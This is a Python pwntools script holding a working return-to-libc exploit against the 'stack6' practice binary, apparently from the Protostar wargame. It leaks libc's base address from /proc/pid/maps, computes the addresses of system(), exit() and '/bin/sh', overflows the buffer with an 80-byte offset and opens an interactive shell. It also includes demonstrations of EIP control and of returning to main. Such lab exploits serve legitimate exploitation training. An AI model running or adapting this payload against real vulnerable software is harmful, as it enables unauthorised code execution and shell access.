#!/usr/bin/env python3

from pwn import *
import time

# Configuration
context.arch = 'i386'
context.os = 'linux'
context.log_level = 'info'

def exploit():
    """Stack6 Return-to-libc Shell Exploit"""
    
    binary_path = './binaries/stack6'
    
    log.info("=== Stack6 Return-to-libc Exploit ===")
    
    # Load binary and libc
    elf = ELF(binary_path)
    libc = ELF('/lib32/libc.so.6')
    
    # Start process to get libc base
    p = process(binary_path)
    pid = p.pid
    
    # Find libc base from process maps
    with open(f'/proc/{pid}/maps', 'r') as f:
        maps = f.read()
    
    libc_base = None
    for line in maps.split('\n'):
        if 'libc-' in line or 'libc.so' in line:
            libc_base = int(line.split('-')[0], 16)
            break
    
    p.close()
    
    if not libc_base:
        log.error("Could not find libc base")
        return
    
    log.info(f"libc base: {hex(libc_base)}")
    
    # Calculate gadget addresses
    system_addr = libc_base + libc.symbols['system']
    exit_addr = libc_base + libc.symbols['exit']
    binsh_addr = libc_base + next(libc.search(b'/bin/sh'))
    
    log.info(f"system(): {hex(system_addr)}")
    log.info(f"exit(): {hex(exit_addr)}")
    log.info(f"/bin/sh: {hex(binsh_addr)}")
    
    # Build exploit payload
    # Buffer overflow: 76 bytes + 4 bytes saved EBP = 80 bytes offset
    payload = b'A' * 80
    payload += p32(system_addr)   # Return address -> system()
    payload += p32(exit_addr)     # Return from system() -> exit()
    payload += p32(binsh_addr)    # Argument to system() -> "/bin/sh"
    
    log.info(f"Payload size: {len(payload)} bytes")
    log.info(f"Payload: {payload.hex()}")
    
    # Launch exploit
    log.info("Launching exploit...")
    p = process(binary_path)
    
    # Send payload
    p.sendline(payload)
    
    # Wait a moment for shell to spawn
    time.sleep(0.5)
    
    # Send a command to verify shell
    p.sendline(b'id')
    
    try:
        # Try to receive output
        output = p.recvline(timeout=2)
        log.info(f"Shell output: {output}")
        
        # If we got output, we have a shell
        if output:
            log.success("Shell spawned successfully!")
            log.info("Type 'exit' to quit the shell")
            p.interactive()
        else:
            log.warning("No shell output received")
            
    except EOFError:
        log.info("Shell may have spawned but exited quickly")
    except:
        log.error("Failed to get shell response")
    
    p.close()

def demo_eip_control():
    """Demonstrate EIP control with crash"""
    log.info("=== EIP Control Demonstration ===")
    
    # Simple crash with controlled EIP
    payload = b'A' * 76          # Fill buffer
    payload += b'BBBB'           # Saved EBP
    payload += p32(0x41414141)   # Controlled EIP
    
    log.info(f"Payload: {payload.hex()}")
    
    p = process('./binaries/stack6')
    p.sendline(payload)
    
    # Wait for crash
    p.wait()
    log.success("Crashed with controlled EIP = 0x41414141")
    
def demo_ret2main():
    """Return to main for infinite loop demo"""
    log.info("=== Return-to-main Demo ===")
    
    elf = ELF('./binaries/stack6')
    main_addr = elf.symbols['main']
    
    payload = b'A' * 80
    payload += p32(main_addr)
    
    log.info(f"Returning to main at: {hex(main_addr)}")
    
    p = process('./binaries/stack6')
    p.sendline(payload)
    
    # Should loop back to main
    try:
        output = p.recv(timeout=2)
        log.info(f"Program output: {output}")
        if b'input path please:' in output:
            log.success("Successfully returned to main!")
    except:
        pass
    
    p.close()

if __name__ == '__main__':
    import sys
    
    if len(sys.argv) > 1:
        if sys.argv[1] == 'shell':
            exploit()
        elif sys.argv[1] == 'crash':
            demo_eip_control()
        elif sys.argv[1] == 'loop':
            demo_ret2main()
        else:
            print("Usage: python3 stack6_shell.py [shell|crash|loop]")
    else:
        print("=== Stack6 Exploit PoC ===")
        print("Options:")
        print("  shell - Return-to-libc shell exploit")
        print("  crash - EIP control demonstration")
        print("  loop  - Return-to-main demonstration")
        print("")
        print("Example: python3 stack6_shell.py shell")
        print("")
        # Run shell exploit by default
        exploit()

